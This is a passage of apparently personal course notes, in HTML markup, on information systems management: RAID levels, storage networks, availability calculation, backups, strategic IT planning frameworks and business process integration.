&lt;li&gt;Document/file managment system (DMS)&lt;/li&gt;
&lt;li&gt;Content management system (CMS)
&lt;ul&gt;
&lt;li&gt;Website support&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Knowledge manager system&lt;/li&gt;
&lt;li&gt;Customer relationship management (CRM)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;raid&#34; &gt;RAID
&lt;span&gt;
    &lt;a href=&#34;#raid&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Redundant array of independent disks. The OS thinks there is only one disk.&lt;/li&gt;
&lt;li&gt;Data Striping: unit one goes here, unit two goes there, unit three goes here as if there&amp;rsquo;s one big disk; parallelism&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;raid-0&#34; &gt;RAID 0
&lt;span&gt;
    &lt;a href=&#34;#raid-0&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Distributing data across at least 2 disks; each disk has different information.&lt;/p&gt;
&lt;h3 id=&#34;raid-1&#34; &gt;RAID 1
&lt;span&gt;
    &lt;a href=&#34;#raid-1&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Data is the same on all devices&lt;/p&gt;
&lt;h3 id=&#34;raid-10&#34; &gt;RAID 10
&lt;span&gt;
    &lt;a href=&#34;#raid-10&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Needs at least 4. Multiple groups of RAID 0s. Each group of disks gets different data.&lt;/p&gt;
&lt;p&gt;Or RAID 1 PLUS 0&lt;/p&gt;
&lt;h3 id=&#34;raid-5&#34; &gt;RAID 5
&lt;span&gt;
    &lt;a href=&#34;#raid-5&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;At least 3. Stripping with parity. Parity means if a disk fails, the parity can be used to generate the disk that fails. Parity is just enough information to recover the failed disk given that the other disks are available.&lt;/p&gt;
&lt;h3 id=&#34;storage-area-network&#34; &gt;Storage Area Network
&lt;span&gt;
    &lt;a href=&#34;#storage-area-network&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Fibre Channel Switch
&lt;ul&gt;
&lt;li&gt;High performance to handle lots of data traffic&lt;/li&gt;
&lt;li&gt;Like a router but for fibre optics and wi-fi routing&lt;/li&gt;
&lt;li&gt;Wired connected to multiple RAID disks&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Block-level storage
&lt;ul&gt;
&lt;li&gt;Hard drives appear as locally attached devices&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;practical-exercise&#34; &gt;Practical Exercise
&lt;span&gt;
    &lt;a href=&#34;#practical-exercise&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;500,000 TB storage capacity, Seagate 10TB drives. 0.7% annual failure rate (AFR)&lt;/p&gt;
&lt;p&gt;Design for 99.99% availability.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;redundancy, fault-tolerance, load balancing, regular maintenance&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;RAID 10 to tolerate drive failure&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Distributed storage to increase reliability and availability&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Hot swappable driver - can replace drivers while system is running&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Mean Time Between Failure = 1 / annual fail rate&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Mean Time to Repair = 1 / 365&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Availability = Mean Time Between Failure / (MTBF + Mean Time To Repair)&lt;/p&gt;
&lt;h3 id=&#34;backup&#34; &gt;Backup
&lt;span&gt;
    &lt;a href=&#34;#backup&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Online backup (hot)&lt;/li&gt;
&lt;li&gt;Instant, protects against at least one HD failure&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;offline-backup&#34; &gt;Offline backup
&lt;span&gt;
    &lt;a href=&#34;#offline-backup&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Done end of day&lt;/li&gt;
&lt;li&gt;Protect against complete failure&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;archive&#34; &gt;Archive
&lt;span&gt;
    &lt;a href=&#34;#archive&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Full backups&lt;/li&gt;
&lt;li&gt;Differential backups
&lt;ul&gt;
&lt;li&gt;alters existing backup&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Incremental backups
&lt;ul&gt;
&lt;li&gt;Backup additions and alternations since the last incremental backup&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;strategic-planning&#34; &gt;Strategic Planning
&lt;span&gt;
    &lt;a href=&#34;#strategic-planning&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Defining an organization&amp;rsquo;s direction&lt;/li&gt;
&lt;li&gt;Allocation its resources to pursue this direction&lt;/li&gt;
&lt;li&gt;Planning helps a business identify its goals however technology changes very fast&lt;/li&gt;
&lt;li&gt;Strategic focus: 3-5 years (business processes) led by senior management&lt;/li&gt;
&lt;li&gt;Tactical focus: 1-2 years (resource allocation and project selection) led by middle managers&lt;/li&gt;
&lt;li&gt;Operational focus: 6-12 months (project management, budget) professionals&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;why-planning-is-so-difficult&#34; &gt;Why Planning Is So Difficult
&lt;span&gt;
    &lt;a href=&#34;#why-planning-is-so-difficult&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;Alignment of strategic business Goals and
systems plans&lt;/li&gt;
&lt;li&gt;Technologies are rapidly changing&lt;/li&gt;
&lt;li&gt;Companies need IT portfolios rather than
projects&lt;/li&gt;
&lt;li&gt;Infrastructure development is difficult to fund&lt;/li&gt;
&lt;li&gt;Responsibility needs to be joint&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;changing-world-of-planing&#34; &gt;Changing World of Planing
&lt;span&gt;
    &lt;a href=&#34;#changing-world-of-planing&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;closest to the action
&lt;ul&gt;
&lt;li&gt;organizational edge&lt;/li&gt;
&lt;li&gt;outside-in approach&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;strategic envelope
&lt;ul&gt;
&lt;li&gt;top management&lt;/li&gt;
&lt;li&gt;set parameters&lt;/li&gt;
&lt;li&gt;open and regulation communication&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;eight-planning-techniques&#34; &gt;Eight Planning Techniques
&lt;span&gt;
    &lt;a href=&#34;#eight-planning-techniques&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Stages of growth
&lt;ul&gt;
&lt;li&gt;Early successes (adoption), Contagion, Control, Integration, Data administration, Maturity&lt;/li&gt;
&lt;li&gt;assumes all organization are in the same stages in the same order&lt;/li&gt;
&lt;li&gt;pro: roadmap. con: assumes all orgs go through same stages in same order&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Critical success factor (CSFs)
&lt;ul&gt;
&lt;li&gt;few key areas that must go right&lt;/li&gt;
&lt;li&gt;monitoring and building&lt;/li&gt;
&lt;li&gt;pro: resource alignment&lt;/li&gt;
&lt;li&gt;con: oversimplifying complex processes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Competitive Forces Model
&lt;ul&gt;
&lt;li&gt;Porter&amp;rsquo;s five force { threat of new entrants, threat of substitutes, supplier power, buyer power, competitive rivalry }&lt;/li&gt;
&lt;li&gt;pro: understanding competitive forces&lt;/li&gt;
&lt;li&gt;con: fails to capture tech and societal shifts&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Three Emerging Forces (Digitization, Globalization, Deregulation)
&lt;ul&gt;
&lt;li&gt;new business models&lt;/li&gt;
&lt;li&gt;telecommunications and transportation&lt;/li&gt;
&lt;li&gt;many industries&lt;/li&gt;
&lt;li&gt;pro: anticipate major trends&lt;/li&gt;
&lt;li&gt;con: overlook industry/region specific factors&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Porter&amp;rsquo;s Value Chain Analysis
&lt;ul&gt;
&lt;li&gt;support activities { firm infrastructure, HR management, tech development, procurement }&lt;/li&gt;
&lt;li&gt;primary activities { inbound logistics, operations, outbound logistics, marketing &amp;amp; sales, service }&lt;/li&gt;
&lt;li&gt;information as a source of value itself instead of as support&lt;/li&gt;
&lt;li&gt;pro: value adding activity analysis&lt;/li&gt;
&lt;li&gt;con: complex and time-consuming and does not capture intangibles&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;E-Business Value Matrix
&lt;ul&gt;
&lt;li&gt;new fundamentals { criticality to business = low, newness of idea = low }&lt;/li&gt;
&lt;li&gt;operational excellence { high, low  }&lt;/li&gt;
&lt;li&gt;rational experimentation { low, high }&lt;/li&gt;
&lt;li&gt;breakthrough strategy { high, high }&lt;/li&gt;
&lt;li&gt;pro: identify opportunities for digital/online&lt;/li&gt;
&lt;li&gt;con: no offline&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Linkage Analysis Planning
&lt;ul&gt;
&lt;li&gt;Examines the links between organizations in order to create a strategy for utilizing electronic channels&lt;/li&gt;
&lt;li&gt;pro: understand relationships&lt;/li&gt;
&lt;li&gt;con: complex and overlooks internals&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scenario Planning
&lt;ul&gt;
&lt;li&gt;long-term thinking to prepare for various scenarios&lt;/li&gt;
&lt;li&gt;explore forces that could cause different scenarios of the future to happen&lt;/li&gt;
&lt;li&gt;time consuming and highly uncertain. Risk of bias&lt;/li&gt;
&lt;li&gt;define decision problem and time frame&lt;/li&gt;
&lt;li&gt;identify major known trends&lt;/li&gt;
&lt;li&gt;identify driving uncertainties&lt;/li&gt;
&lt;li&gt;construct scenarios&lt;/li&gt;
&lt;li&gt;pro: long-term thinking, flexibility&lt;/li&gt;
&lt;li&gt;con: time-consuming, uncertain, bias&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;managing-corporate-information-resources&#34; &gt;Managing Corporate Information Resources
&lt;span&gt;
    &lt;a href=&#34;#managing-corporate-information-resources&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;it-infrastructure&#34; &gt;IT Infrastructure
&lt;span&gt;
    &lt;a href=&#34;#it-infrastructure&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Hardware&lt;/li&gt;
&lt;li&gt;OS platform&lt;/li&gt;
&lt;li&gt;Application platform&lt;/li&gt;
&lt;li&gt;Data Management platform&lt;/li&gt;
&lt;li&gt;Network platform&lt;/li&gt;
&lt;li&gt;Internet platform&lt;/li&gt;
&lt;li&gt;Service platform&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;approaches-to-manage&#34; &gt;Approaches to Manage
&lt;span&gt;
    &lt;a href=&#34;#approaches-to-manage&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Cost-centric view: minimizing IT infrastructure&lt;/li&gt;
&lt;li&gt;Service-Centric view: prioritize delivering reliable and high-quality IT services to meet user needs, focusing on service availability, performance monitoring, and incident response&lt;/li&gt;
&lt;li&gt;Innovation-Centric View: firms leverage IT infrastructure for innovation, seeking competitive advantage and business growth&lt;/li&gt;
&lt;li&gt;Risk-Centric view: risk management, robust security measures, disaster recovery&lt;/li&gt;
&lt;li&gt;Agility-Centric view: flexibility to respond quickly&lt;/li&gt;
&lt;li&gt;Data-Centric view: data-driven decision&lt;/li&gt;
&lt;li&gt;User-Centric view: end-user prioritization&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;value-chain-model&#34; &gt;Value Chain Model
&lt;span&gt;
    &lt;a href=&#34;#value-chain-model&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Multiple software systems for each part of the process: warehouse, operations, ordering, servicing, outbound / shipping&lt;/p&gt;
&lt;p&gt;problem: integration between the systems&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;could not detect a small item is missing&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;system should analyze habits of suppliers, users, employees, customers.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;suppliers and their suppliers, firm, distributors, customers&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Enhancement through information systems&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Automating and streamlining primary activities (production, delivery, customer service)&lt;/li&gt;
&lt;li&gt;Optimizing support activities (procurement, logistics, human resources)&lt;/li&gt;
&lt;li&gt;Gathering and analyzing customer data (develop new products that meet customers&amp;rsquo; needs)&lt;/li&gt;
&lt;li&gt;Improving communication and collaboration (with stakeholders to enhance experience)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;business-process-bp&#34; &gt;Business Process (BP)
&lt;span&gt;
    &lt;a href=&#34;#business-process-bp&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Collection of business functions related to each other
&lt;ul&gt;
&lt;li&gt;organization specific&lt;/li&gt;
&lt;li&gt;specific business function or across many BF&amp;rsquo;s&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;example: billing process in a physician clinic&lt;/li&gt;
&lt;li&gt;IBM business process software&lt;/li&gt;
&lt;li&gt;cross-functional
&lt;ul&gt;
&lt;li&gt;order fulfillment process requires sales, accounting, manufacturing &amp;amp; production&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;integration-tools&#34; &gt;Integration Tools
&lt;span&gt;
    &lt;a href=&#34;#integration-tools&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Enterprise Resource Planning (ERP)
&lt;ul&gt;
